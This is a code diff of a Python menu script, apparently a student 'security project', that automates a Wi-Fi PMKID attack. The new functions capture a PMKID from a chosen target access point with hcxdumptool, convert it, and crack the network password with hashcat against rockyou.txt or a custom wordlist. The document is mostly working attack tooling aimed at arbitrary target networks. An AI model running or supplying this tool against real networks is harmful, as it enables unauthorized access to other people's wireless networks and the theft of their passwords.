@@ -8,26 +8,23 @@ interface = None
 def start():
     print("\nInstalling necessary Tools..")
     print("This may take a while, please be patient\n")
-    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver -y")
+    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver hashcat -y")
     os.system("sleep 3 && clear")
 
 def main():
     cmd = os.system("clear")
     print("""\033[1;92m
-░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
-░█░█░▀█▀░█▀▀░▀█▀░░░░░░░░░█▀█░█▀▀░█▀█░▀█▀░█▀▀░█▀▀░▀█▀░░░▀█▀░█▀█░█▀█░█░░
-░█▄█░░█░░█▀▀░░█░░░░▄▄▄░░░█▀▀░█▀▀░█░█░░█░░█▀▀░▀▀█░░█░░░░░█░░█░█░█░█░█░░
-░▀░▀░▀▀▀░▀░░░▀▀▀░░░░░░░░░▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀▀▀░░▀░░░░░▀░░▀▀▀░▀▀▀░▀░░
                                             
 -------------------------------------------------------------------------  
-[+] You may need external wifi adapter for some features
+[+] Security Project: WIFI Hacking PMKID Attack
 [+] Press CTRl + B to go back to main menu
 
-(1)Networks attacks (Bssid,monitor mode needed)       
-(2)Scan Networks
-(3)Capturing Handshake(monitor mode needed)                    
-(4)Crack Handshake (Handshake needed)               
-(5)Create your own passwordlist
+(1) PMKID Attack - Step 1: Monitor & Capture PMKID
+(2) PMKID Attack - Step 2: Crack PMKID Password
+(3) Scan Networks
+(4) Capturing Handshake(monitor mode needed)                    
+(5) Crack Handshake (Handshake needed)               
+(6) Create your own passwordlist
 
 (00)Exit
 ----------------------------------------------------------------------- """)
@@ -35,10 +32,20 @@ def main():
     number = input("[+] Enter the number : ")
 
     if number == "1":
-        network_attacks()
+        pmkid_step1_capture()
     elif number == "2":
+        pmkid_step2_crack()
+    elif number == "3":
         show_networks()
+    elif number == "4":
+        print("[!] Handshake capture not implemented yet")
+        time.sleep(2)
+        main()
     elif number == "5":
+        print("[!] Handshake cracking not implemented yet")
+        time.sleep(2)
+        main()
+    elif number == "6":
         create_passwordlist()
     elif number == "00":
         exit()
@@ -70,24 +77,6 @@ def stop_monitor_mode():
     time.sleep(4)
     main()
 
-
-def network_attacks():
-    global interface
-    if interface is None:
-        print("\n[!] Your adapter must be in monitor mode first.")
-        start_monitor_mode()
-    print("\n")
-    print("1. PMKID Attack")
-  
-    print("\n")
-    choice = input("[+] Enter the number : ").strip()
-    if choice == "1":
-        pmkid_attack()
-    else:
-        print("Invalid number..")
-        network_attacks()
-
-
 def show_networks():
     global interface
     if interface is None:
@@ -97,59 +86,142 @@ def show_networks():
     time.sleep(2)
     os.system(f"airodump-ng {interface}")
 
-
-def pmkid_attack():
+def pmkid_step1_capture():
+    """Step 1: Monitor networks and capture PMKID"""
     global interface
     if interface is None:
         print("\n[!] Your adapter must be in monitor mode first.")
         start_monitor_mode()
 
+    print("\n" + "="*60)
+    print("PMKID ATTACK - STEP 1: MONITOR & CAPTURE")
+    print("="*60)
+
+    # Scan for networks
+    print("\n[+] Scanning for available networks...")
     show_networks()
 
-    bssid = input("\nEnter the BSSID of the target AP : ").strip()
-    channel = input("\nEnter Channel of the target AP : ").strip()
+    # Get target details
+    bssid = input("\nEnter the BSSID of the target AP: ").strip()
+    channel = input("Enter Channel of the target AP: ").strip()
+    
+    if not bssid or not channel:
+        print("[!] BSSID and Channel are required!")
+        time.sleep(2)
+        pmkid_step1_capture()
+        return
+
+    # Set channel
     subprocess.run(["iwconfig", interface, "channel", channel])
 
-    print("\nStarting hcxdumptool to capture PMKID... Press CTRL+C to stop.")
+    # Capture PMKID
+    print(f"\n[+] Starting hcxdumptool to capture PMKID from {bssid}...")
+    print("[+] Press CTRL+C to stop when PMKID is captured.")
     time.sleep(3)
-    os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
     
+    try:
+        os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
+    except KeyboardInterrupt:
+        print("\n[+] PMKID capture stopped by user.")
+
     pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
-    print(f"\nPMKID captured. Check at {pmkid_path}\n")
-    time.sleep(5)
-
-    print("\n[1] Crack PMKID using existing wordlist")
-    print("[2] Crack PMKID using custom wordlist")
-    choice = input("\n[+] Enter the number: ").strip()
-
-    if choice == "1":
-        rockyou_path = "./rockyou.txt"
-        rockyou_gz_path = "./rockyou.txt.gz"
-        if not os.path.exists(rockyou_path):
-            if os.path.exists(rockyou_gz_path):
-                print("\nExtracting rockyou.txt ...")
-                os.system(f"gzip -d {rockyou_gz_path}")
-            else:
-                print("\n[!] rockyou.txt or rockyou.txt.gz not found!")
-                return
-        print("\nTo exit Press CTRL +C")
-        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
-        os.system(f"hashcat -m 22000 pmkid.22000 {rockyou_path}")
-    elif choice == "2":
-        wordlist = input("\nEnter the path of the wordlist file: ").strip()
-        if not os.path.exists(wordlist):
-            print("\n[!] Wordlist file not found!")
-            return
-        print("\nTo exit Press CTRL +C")
-        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
-        os.system(f"hashcat -m 22000 pmkid.22000 {wordlist}")
+    if os.path.exists(pmkid_path):
+        print(f"\n[✔] PMKID captured successfully! Saved at: {pmkid_path}")
+        print("\n[+] You can now proceed to Step 2 to crack the password.")
     else:
-        print("\n[!] Invalid option. Please enter 1 or 2.")
-        pmkid_attack()
-    time.sleep(15)
+        print("\n[✘] PMKID capture failed or file not found.")
+
+    time.sleep(5)
     main()
 
+def pmkid_step2_crack():
+    """Step 2: Convert PMKID to hash format and crack password using hashcat"""
+    print("\n" + "="*60)
+    print("PMKID ATTACK - STEP 2: CRACK PASSWORD")
+    print("="*60)
 
+    # Check if pmkid.pcapng exists
+    pmkid_path = "pmkid.pcapng"
+    if not os.path.exists(pmkid_path):
+        print(f"\n[!] {pmkid_path} not found in current directory.")
+        print("[+] You need to run Step 1 first to capture PMKID, or")
+        custom_path = input("Enter the full path to your pmkid.pcapng file: ").strip()
+        if not custom_path or not os.path.exists(custom_path):
+            print("[!] Invalid path or file not found!")
+            time.sleep(2)
+            main()
+            return
+        pmkid_path = custom_path
+
+    print(f"\n[+] Using PMKID file: {pmkid_path}")
+
+    # Convert to 22000 format
+    print("[+] Converting pcapng to hash file...")
+    try:
+        subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
+        print("[✔] Successfully converted to pmkid.22000")
+    except subprocess.CalledProcessError:
+        print("[✘] Failed to convert PMKID file. Make sure hcxtools is installed.")
+        time.sleep(2)
+        main()
+        return
+    except FileNotFoundError:
+        print("[✘] hcxpcapngtool not found. Make sure hcxtools is installed.")
+        time.sleep(2)
+        main()
+        return
+
+    hashfile = "pmkid.22000"
+    if not os.path.exists(hashfile):
+        print("[✘] Failed to create hash file!")
+        time.sleep(2)
+        main()
+        return
+
+    # Choose wordlist
+    print("\n[1] Use rockyou.txt (default)")
+    print("[2] Use custom wordlist")
+    choice = input("\n[+] Enter your choice: ").strip()
+
+    if choice == "1":
+        wordlist = "rockyou.txt"
+        gz_path = "rockyou.txt.gz"
+        if not os.path.exists(wordlist):
+            if os.path.exists(gz_path):
+                print("[+] Extracting rockyou.txt.gz ...")
+                os.system(f"gzip -d {gz_path}")
+            else:
+                print("[!] rockyou.txt or rockyou.txt.gz not found!")
+                print("[+] Please download rockyou.txt or provide a custom wordlist.")
+                time.sleep(2)
+                main()
+                return
+    elif choice == "2":
+        wordlist = input("\nEnter the full path to the wordlist: ").strip()
+        if not os.path.exists(wordlist):
+            print("[!] Wordlist not found!")
+            time.sleep(2)
+            main()
+            return
+    else:
+        print("[!] Invalid choice.")
+        time.sleep(2)
+        main()
+        return
+
+    # Start cracking with hashcat
+    print(f"\n[+] Starting PMKID cracking with hashcat using {wordlist}...")
+    print("[+] This may take a while depending on the wordlist size...")
+    print("[+] To exit Press CTRL +C")
+    
+    try:
+        os.system(f"hashcat -m 22000 {hashfile} {wordlist}")
+        print("\n[✔] Hashcat cracking completed!")
+    except KeyboardInterrupt:
+        print("\n[+] Cracking stopped by user.")
+
+    time.sleep(10)
+    main()
 
 def create_passwordlist():
     print("\n[+] Size of the file and time taken to create the password list depends on your input..")
@@ -171,7 +243,6 @@ def create_passwordlist():
     time.sleep(15)
     main()
 
-
-
-start()
-main()
+if __name__ == "__main__":
+    start()
+    main()
